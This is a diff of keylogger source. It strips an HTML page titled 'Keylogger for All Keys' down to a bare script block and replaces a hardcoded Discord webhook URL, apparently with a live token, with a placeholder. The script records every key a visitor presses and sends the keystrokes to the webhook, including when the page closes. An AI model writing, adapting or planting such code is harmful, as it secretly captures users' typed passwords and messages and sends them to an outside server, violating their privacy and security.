@@ -1,22 +1,12 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keylogger for All Keys</title>
-</head>
-<body>
-
 <script>
     // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
-    const discordWebhookUrl = 'https://discord.com/api/webhooks/1186692203637125220/dGDC9ghxPxxtstnwICURHnj8w7Lcp3msL4BRP3xQ2NzmwdjrztYmyjJi7Uy2LHWhi16_';
+    const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
 
     let keysPressed = [];
 
     // Function to send keys to Discord webhook
     const sendKeysToDiscord = async () => {
-        const keys = keysPressed.join(', ');
+        const keys = keysPressed.join('');
         const content = `Keys pressed: ${keys}`;
 
         try {
@@ -59,6 +49,3 @@
     // Event listener for beforeunload (when the user leaves the page)
     window.addEventListener('beforeunload', sendKeysToDiscord);
 </script>
-
-</body>
-</html>
